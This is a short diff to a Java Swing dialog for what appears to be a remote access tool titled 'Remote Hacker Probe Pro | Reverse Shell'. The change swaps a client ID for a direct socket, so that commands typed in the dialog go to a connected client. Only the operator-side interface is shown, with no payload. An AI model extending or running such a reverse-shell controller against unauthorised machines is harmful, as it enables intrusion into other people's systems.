@@ -24,6 +24,7 @@ import java.awt.event.WindowEvent;
 import java.io.File;
 import java.io.FileWriter;
 import java.io.IOException;
+import java.net.Socket;
 import java.awt.event.ActionEvent;
 import javax.swing.GroupLayout;
 import javax.swing.GroupLayout.Alignment;
@@ -31,17 +32,17 @@ import javax.swing.LayoutStyle.ComponentPlacement;
 import javax.swing.JLabel;
 
 public class Shell extends JDialog {
-	private JTextField ShellInput;
-	public int ShellAccessingClientId;
+	public JTextField ShellInput;
+	public Socket CLIENTSOCKET;
 	public static JTextArea ShellOutput = new JTextArea();
-	JButton ShellGo;
+	public JButton ShellGo;
 	JLabel interact = new JLabel("");
 	public Shell() {
 		
 		MainWindow.HaltAllSystems();
 		setResizable(false);
 		setDefaultCloseOperation(JDialog.DISPOSE_ON_CLOSE);
-		setTitle("Remote Hacker Probe | Reverse Shell");
+		setTitle("Remote Hacker Probe Pro | Reverse Shell");
 		setBounds(100, 100, 633, 387);
 		
 		ShellInput = new JTextField();
@@ -74,7 +75,7 @@ public class Shell extends JDialog {
 				String shellexec = ShellInput.getText().strip();
 				if(shellexec.length() > 0) {
 					ShellOutput.append(">> " + shellexec);
-					Server.SendData(Server.Clients.get(ShellAccessingClientId), shellexec);
+					Server.SendData(CLIENTSOCKET, shellexec);
 					ShellInput.setText("");
 					ServerThread.WaitForReply();
 				}	
